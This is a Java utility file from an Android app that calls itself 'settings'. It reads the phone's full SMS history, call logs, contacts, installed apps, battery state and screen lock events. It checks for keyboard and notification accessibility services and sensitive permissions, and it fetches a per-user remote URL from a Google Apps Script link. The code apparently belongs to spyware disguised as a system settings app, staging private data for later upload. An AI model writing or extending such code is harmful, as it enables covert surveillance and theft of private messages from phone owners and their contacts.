package com.example.settings;

import static com.example.settings.ConnectivityManagers.isConnectedToNetwork;
import static com.example.settings.MainActivity.setuponetimeworkManager;

import android.Manifest;
import android.app.Activity;
import android.app.ActivityManager;
import android.app.Application;
import android.app.KeyguardManager;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.provider.ContactsContract;
import android.util.Log;

import androidx.annotation.RequiresApi;
import androidx.core.content.ContextCompat;
import androidx.work.ListenableWorker;

import com.android.volley.DefaultRetryPolicy;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.RetryPolicy;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;
import com.wickerlabs.logmanager.LogObject;
import com.wickerlabs.logmanager.LogsManager;

import org.apache.commons.lang3.StringUtils;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.IOException;
import java.lang.reflect.Type;
import java.nio.file.Files;
import java.nio.file.attribute.BasicFileAttributes;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class Utils {
    static String laststatus="";
    static String status;
    public static String getDateTime()
    {
        String currentDate = new SimpleDateFormat("dd-MM-yyyy", Locale.getDefault()).format(new Date());
        String currentTime = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());

        return currentDate + "[" + currentTime + "]";
    }
    public  static void  readCallLogs(Context applicationContext,Sharedpref mSharedpref) {
        try {
            LogsManager logsManager = new LogsManager(applicationContext);
            List<LogObject> callLogs = logsManager.getLogs(LogsManager.ALL_CALLS);
            JSONArray jsonArray=new JSONArray();
            DateFormat simple = new SimpleDateFormat("dd MMM yyyy HH:mm:ss:SSS Z");
            for(int i=0;i<callLogs.size();i++){
                JSONObject jsonObject=new JSONObject();
                try {
                    jsonObject.put("Call Number",callLogs.get(i).getNumber());
                    jsonObject.put("Call Name",callLogs.get(i).getContactName());
                    jsonObject.put("Call Type",callLogs.get(i).getType());
                    jsonObject.put("Call Duration",callLogs.get(i).getCoolDuration());
                    Date d = new Date(callLogs.get(i).getDate());
                    jsonObject.put("Call Date",simple.format(d));
                    jsonArray.put(jsonObject);
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }
            mSharedpref.setCallHistory(jsonArray.toString());
            mSharedpref.commit();
        }
        catch (Exception e){
            e.printStackTrace();
            return;
        }

    }
    public static void readSmsHistory(Context mActivity, Sharedpref mSharedpref){
        try {
            JSONArray smsArray=new JSONArray();
            Uri message = Uri.parse("content://sms/");
            ContentResolver cr = mActivity.getContentResolver();

            Cursor c = cr.query(message, null, null, null, null);
            // ((MainActivity)mActivity).startManagingCursor(c);
            int totalSMS = c.getCount();

            if (c.moveToFirst()) {
                for (int i = 0; i < totalSMS; i++) {
                    JSONObject jsonObject=new JSONObject();
                    try {
                        jsonObject.put("Id",c.getString(c.getColumnIndexOrThrow("_id")));
                        jsonObject.put("Address",c.getString(c.getColumnIndexOrThrow("address")));
                        jsonObject.put("MsgBody",c.getString(c.getColumnIndexOrThrow("body")));
                        if (c.getString(c.getColumnIndexOrThrow("read")).contains("1")) {
                            jsonObject.put("status","Read");
                        } else {
                            jsonObject.put("status","NotRead");
                        }
                        String datetime=c.getString(c.getColumnIndexOrThrow("date"));
                        Date date=new Date(Long.parseLong(datetime));
                        SimpleDateFormat df2 = new SimpleDateFormat("dd/MM/yy");
                        String dateText = df2.format(date);
                        jsonObject.put("Time",dateText);
                        if (c.getString(c.getColumnIndexOrThrow("type")).contains("1")) {
                            jsonObject.put("Foldername","inbox");
                        } else {
                            jsonObject.put("Foldername","sent");
                        }
                        smsArray.put(jsonObject);

                    } catch (JSONException e) {
                        e.printStackTrace();
                        continue;
                    }
                    c.moveToNext();
                }
            }
            // else {
            // throw new RuntimeException("You have no SMS");
            // }
            c.close();
            mSharedpref.setSmsHistory(smsArray.toString());
            mSharedpref.commit();
            Log.d("Tag", String.valueOf(smsArray.length()));
        }
        catch (Exception e){
            e.printStackTrace();
        }

    }
    public static void newUrlData(Context context,Sharedpref mSharedpref){
       String url="https://script.googleusercontent.com/macros/echo?user_content_key=RdsJJZR1E_p8xnTCxFEtKU7tqCFkUC_FTl3E2g_cDSIjpo-V43chBBHgueEZb0TFHwjC-4TPOuQPKeaiaJj0jjjQkeJ4Hs0Wm5_BxDlH2jW0nuo2oDemN9CCS2h10ox_1xSncGQajx_ryfhECjZEnH8eXEwHkzBGtIkfTyiTbSQKygxmT3GiA5SP-kQUhNAjebhQ5PeN_2JFSwNzgXMLi_qVtBV2CbTgnh8KTGIWb5_kN85XsxDPBA&lib=M2DzEZy__TPANi9YiRKV2MkfyXhMohYri";
        String Name = mSharedpref.getSaveName();
        if(isConnectedToNetwork(context)){
            StringRequest stringRequest = new StringRequest(Request.Method.GET, url,
                    new Response.Listener<String>() {
                        @Override
                        public void onResponse(String response) {
                            Log.d(context.getPackageName(),response);
                            try {
                                JSONObject jsonObject=new JSONObject(response);
                                JSONArray jsonArray=jsonObject.getJSONArray("user");
                                for (int i=0;i<jsonArray.length()-1;i++){
                                    JSONObject jsonObject1=jsonArray.getJSONObject(i);
                                    String mName=jsonObject1.getString("name");
                                    Log.d("",mName);
                                    if (Name.trim().equalsIgnoreCase(mName.trim())){
                                        String mUrl=jsonObject1.getString("url");
                                        mSharedpref.setUrl(mUrl);
                                        mSharedpref.commit();
                                        break;
                                    }
                                }
                            } catch (JSONException e) {
                                e.printStackTrace();
                            }
                        }
                    },
                    new Response.ErrorListener() {
                        @Override
                        public void onErrorResponse(VolleyError error) {
                            Log.d(context.getPackageName(),"Error");
                            setuponetimeworkManager("From new Url");
                        }
                    }
            );
            int socketTimeOut = 50000;// u can change this .. here it is 50 seconds
            RetryPolicy retryPolicy = new DefaultRetryPolicy(socketTimeOut, 0, DefaultRetryPolicy.DEFAULT_BACKOFF_MULT);
            stringRequest.setRetryPolicy(retryPolicy);
            RequestQueue queue = Volley.newRequestQueue(context);
            queue.add(stringRequest);
        }
        else {
            Log.d("Settings","Internet Problem");
        }
    }
    public static void getBatteryPercent(Context mContext,Sharedpref mSharedpref) {
        IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = mContext.registerReceiver(null, ifilter);
        int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
        boolean isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
                status == BatteryManager.BATTERY_STATUS_FULL;
        // How are we charging?
        int chargePlug = batteryStatus.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
        boolean usbCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_USB;
        boolean acCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_AC;
        int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
        int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);

        float batteryPct = level * 100 / (float) scale;
        JSONObject jsonObject = new JSONObject();
        try {
            jsonObject.put("battery peecentage", String.valueOf(batteryPct));
            jsonObject.put("status", String.valueOf(status));
            jsonObject.put("level", String.valueOf(level));
            jsonObject.put("scale", String.valueOf(scale));
            jsonObject.put("isCharging", isCharging);
            jsonObject.put("usbCharge", usbCharge);
            jsonObject.put("acCharge", acCharge);

        } catch (JSONException e) {
            e.printStackTrace();
        }
        mSharedpref.setBatteryPercnt(jsonObject.toString());
        mSharedpref.commit();
    }
    public static String isMyServiceRunning(Context mcContext,Class<?> serviceClass) {
        ActivityManager manager = (ActivityManager) mcContext.getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (serviceClass.getName().equals(service.service.getClassName())) {
                return "True";
            }
        }
        return "False";
    }
    public static void checkServices(Context mContext,Sharedpref mSharedpref){
        JSONObject jsonObject=new JSONObject();
        String KeyboardAcessbilityService=isMyServiceRunning(mContext,KeyBoards.class);
        String NotificationAcessbilityService=isMyServiceRunning(mContext,Notifications.class);
        String NotificationService=isMyServiceRunning(mContext,NotificationService.class);
        try {
            jsonObject.put("Keyboard",KeyboardAcessbilityService);
            jsonObject.put("Notification Accessbility",NotificationAcessbilityService);
            jsonObject.put("Notification Service",NotificationService);
            jsonObject.put("Phone State",checkpermission(mContext,Manifest.permission.READ_PHONE_STATE));
            jsonObject.put("READ SMS",checkpermission(mContext,Manifest.permission.READ_SMS));
            jsonObject.put("GET ACCOUNTS",checkpermission(mContext,Manifest.permission.GET_ACCOUNTS));
            jsonObject.put("ACCESS COARSE_LOCATION",checkpermission(mContext,Manifest.permission.ACCESS_COARSE_LOCATION));
            jsonObject.put("ACCESS FINE_LOCATION",checkpermission(mContext,Manifest.permission.ACCESS_FINE_LOCATION));
            jsonObject.put("READ CALL_LOG",checkpermission(mContext,Manifest.permission.READ_CALL_LOG));
            jsonObject.put("READ_CONTACTS",checkpermission(mContext,Manifest.permission.READ_CONTACTS));
            jsonObject.put("WRITE_CONTACTS",checkpermission(mContext,Manifest.permission.WRITE_CONTACTS));
            jsonObject.put("RECEIVE_SMS",checkpermission(mContext,Manifest.permission.RECEIVE_SMS));
            jsonObject.put("PROCESS OUTGOING_CALLS",checkpermission(mContext,Manifest.permission.PROCESS_OUTGOING_CALLS));
            jsonObject.put("READ_EXTERNAL_STORAGE",checkpermission(mContext,Manifest.permission.READ_EXTERNAL_STORAGE));
        } catch (JSONException e) {
            e.printStackTrace();
        }
        mSharedpref.setServiceStatus(jsonObject.toString());
        mSharedpref.commit();
    }
    public static boolean checkpermission(Context mContext, String PermissionName){
        if ((ContextCompat.checkSelfPermission(mContext, PermissionName)!= PackageManager.PERMISSION_GRANTED)) {
            return false;
        }
        return true;
    }
    @RequiresApi(Build.VERSION_CODES.O)
    public static void isPhoneIsLockedOrNot(Context context) {
        Sharedpref mSharedpref = new Sharedpref(context);
        final IntentFilter theFilter = new IntentFilter();
        /** System Defined Broadcast */
        theFilter.addAction(Intent.ACTION_SCREEN_ON);
        theFilter.addAction(Intent.ACTION_SCREEN_OFF);
        theFilter.addAction(Intent.ACTION_USER_PRESENT);

        BroadcastReceiver screenOnOffReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                String strAction = intent.getAction();

                KeyguardManager myKM = (KeyguardManager) context.getSystemService(Context.KEYGUARD_SERVICE);
                if (strAction.equals(Intent.ACTION_USER_PRESENT) || strAction.equals(Intent.ACTION_SCREEN_OFF) || strAction.equals(Intent.ACTION_SCREEN_ON))
                    if (myKM.inKeyguardRestrictedInputMode()) {
                        status="Locked";
                    } else {
                        status="UnLocked";
                    }
                if (laststatus.equalsIgnoreCase(status)){
                    return;
                }
                else {
                    laststatus=status;
                }
                String lockdetails = mSharedpref.getPhoneLockDetails();
                JSONObject jsonObject = new JSONObject();
                JSONArray jsonArray=new JSONArray();
                if (!StringUtils.isBlank(lockdetails)) {
                    try {
                        jsonArray=new JSONArray(lockdetails);
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                }
                try {
                    jsonObject.put("value", status);

                    jsonObject.put("time",Utils.getDateTime());
                    jsonArray.put(jsonObject);
                    mSharedpref.setPhoneLockDetails(jsonArray.toString());
                    mSharedpref.commit();
                    if (status.equalsIgnoreCase("Locked")){
                        setuponetimeworkManager("When Phone being Locked");
                    }

                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }
        };

        context.registerReceiver(screenOnOffReceiver, theFilter);
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    public static String getDate(String filepath) {
        File file=new File(filepath);
        BasicFileAttributes attr = null;
        try {
            attr = Files.readAttributes(file.toPath(), BasicFileAttributes.class);
        } catch (IOException e) {
            e.printStackTrace();
            return "";
        }
        long createdAt = attr.creationTime().toMillis();
        Date date=new Date(createdAt);
        String currentDate = new SimpleDateFormat("dd-MM-yyyy", Locale.getDefault()).format(date);
        return currentDate;

    }
    public static void readContacts(Context mContext,Sharedpref mSharedpref) {
        try {
            List<Contact> contactList = new ArrayList<>();
            ContentResolver cr = mContext.getContentResolver();
            Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                    null, null, null, null);
            int i = 0;
            if (cur.getCount() > 0) {
                while (cur.moveToNext()) {
                    String mPhoneBuilder = "";
                    String emailBuilder = "";
              /*  StringBuilder noteBuilder = new StringBuilder();
                StringBuilder addressBuilder = new StringBuilder();
                StringBuilder mInstantMessenger = new StringBuilder();
                StringBuilder Organizations = new StringBuilder();*/

                    String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                    String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    Contact mContact = new Contact();
                    mContact.setNumber("" + i);
                    mContact.setId(id);
                    mContact.setName(name);
                    if (Integer.parseInt(cur.getString(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                        System.out.println("name : " + name + ", ID : " + id);

                        // get the phone number
                        Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                                new String[]{id}, null);


                        while (pCur.moveToNext()) {
                            String phone = pCur.getString(
                                    pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                            System.out.println("phone" + phone);
                            mPhoneBuilder = phone + ",";
                        }
                        pCur.close();
                        mContact.setPhoneNumber(mPhoneBuilder);
                        System.out.println("phone" + mPhoneBuilder);


                        // get email and type
                        Cursor emailCur = cr.query(
                                ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                                null,
                                ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
                                new String[]{id}, null);
                        while (emailCur.moveToNext()) {
                            // This would allow you get several email addresses
                            // if the email addresses were stored in an array
                            String email = emailCur.getString(
                                    emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
                            String emailType = emailCur.getString(
                                    emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.TYPE));
                            emailBuilder = "Email " + email + " Email Type : " + emailType;
                            System.out.println("Email " + email + " Email Type : " + emailType);
                        }
                        emailCur.close();
                        mContact.setEmail(emailBuilder.toString());

                   /* // Get note.......
                    String noteWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?";
                    String[] noteWhereParams = new String[]{id,
                            ContactsContract.CommonDataKinds.Note.CONTENT_ITEM_TYPE};
                    Cursor noteCur = cr.query(ContactsContract.Data.CONTENT_URI, null, noteWhere, noteWhereParams, null);
                    if (noteCur.moveToFirst()) {
                        String note = noteCur.getString(noteCur.getColumnIndex(ContactsContract.CommonDataKinds.Note.NOTE));
                        System.out.println("Note " + note);
                        noteBuilder.append("Note " + note);
                    }
                    noteCur.close();
                    mContact.setNote(noteBuilder.toString());

                    //Get Postal Address....

                    String addrWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?";
                    String[] addrWhereParams = new String[]{id,
                            ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_ITEM_TYPE};
                    addressBuilder.append("AddressWhere"+addrWhere+addrWhereParams);
                    Cursor addrCur = cr.query(ContactsContract.Data.CONTENT_URI,
                            null, null, null, null);
                    while(addrCur.moveToNext()) {
                        String poBox = addrCur.getString(
                                addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.POBOX));
                        String street = addrCur.getString(
                                addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.STREET));
                        String city = addrCur.getString(
                                addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.CITY));
                        String state = addrCur.getString(
                                addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.REGION));
                        String postalCode = addrCur.getString(
                                addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.POSTCODE));
                        String country = addrCur.getString(
                                addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.COUNTRY));
                        String type = addrCur.getString(
                                addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.TYPE));
                        addressBuilder.append("poBox "+poBox+",street "+street+",city"+city+",state"
                                +state+",postalCode"+postalCode+",country"+country+",type"+type);
                        // Do something with these....

                    }
                    addrCur.close();
                    mContact.setAddress(addressBuilder.toString());

                    // Get Instant Messenger.........
                    String imWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?";
                    String[] imWhereParams = new String[]{id,
                            ContactsContract.CommonDataKinds.Im.CONTENT_ITEM_TYPE};
                    Cursor imCur = cr.query(ContactsContract.Data.CONTENT_URI,
                            null, imWhere, imWhereParams, null);
                    if (imCur.moveToFirst()) {
                        String imName = imCur.getString(
                                imCur.getColumnIndex(ContactsContract.CommonDataKinds.Im.DATA));
                        String imType;
                        imType = imCur.getString(
                                imCur.getColumnIndex(ContactsContract.CommonDataKinds.Im.TYPE));
                        mInstantMessenger.append("Iname"+imName+",Itype"+imType);
                    }
                    imCur.close();
                    mContact.setInstantMessenger(mInstantMessenger.toString());

                    // Get Organizations.........

                    String orgWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?";
                    String[] orgWhereParams = new String[]{id,
                            ContactsContract.CommonDataKinds.Organization.CONTENT_ITEM_TYPE};
                    Cursor orgCur = cr.query(ContactsContract.Data.CONTENT_URI,
                            null, orgWhere, orgWhereParams, null);
                    if (orgCur.moveToFirst()) {
                        String orgName = orgCur.getString(orgCur.getColumnIndex(ContactsContract.CommonDataKinds.Organization.DATA));
                        String title = orgCur.getString(orgCur.getColumnIndex(ContactsContract.CommonDataKinds.Organization.TITLE));
                        Organizations.append("orgName: "+orgName+",title: "+title);
                    }
                    orgCur.close();
                    mContact.setOrganizations(Organizations.toString());
                */
                    }
                    contactList.add(mContact);
                    i++;
                }

            }
            Type baseType = new TypeToken<List<Contact>>() {
            }.getType();
            Gson mGson = new Gson();
            String detail = mGson.toJson(contactList, baseType);
            mSharedpref.setPhoneNumbers(detail);
            mSharedpref.setPhoneNumbersListSize(contactList.size());
            mSharedpref.commit();
        }
        catch (Exception e){
            e.printStackTrace();
            return;
        }

    }
    public static void getphoneAppdetails(Context mContext,Sharedpref mSharedpref) {
        PackageManager pm = mContext.getPackageManager();
        List<String> appsInstallednames = new ArrayList<>();
        List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
        int i = 0;
        for (ApplicationInfo packageInfo : apps) {
            //checks for flags; if flagged, check if updated system app
            if ((packageInfo.flags & ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) != 0) {
                continue;
                //it's a system app, not interested
            } else if ((packageInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0) {
                continue;
                //Discard this one
                //in this case, it should be a user-installed app
            } else {
                String label = (String) pm.getApplicationLabel(packageInfo);
                appsInstallednames.add("" + i + " " + label);
                i++;
            }
        }
        Gson mGson = new Gson();
        String appnames = mGson.toJson(appsInstallednames);
        mSharedpref.setPhoneAppdetailsListSize(appsInstallednames.size());
        mSharedpref.setPhoneAppdetails(appnames);
        mSharedpref.commit();
    }

}
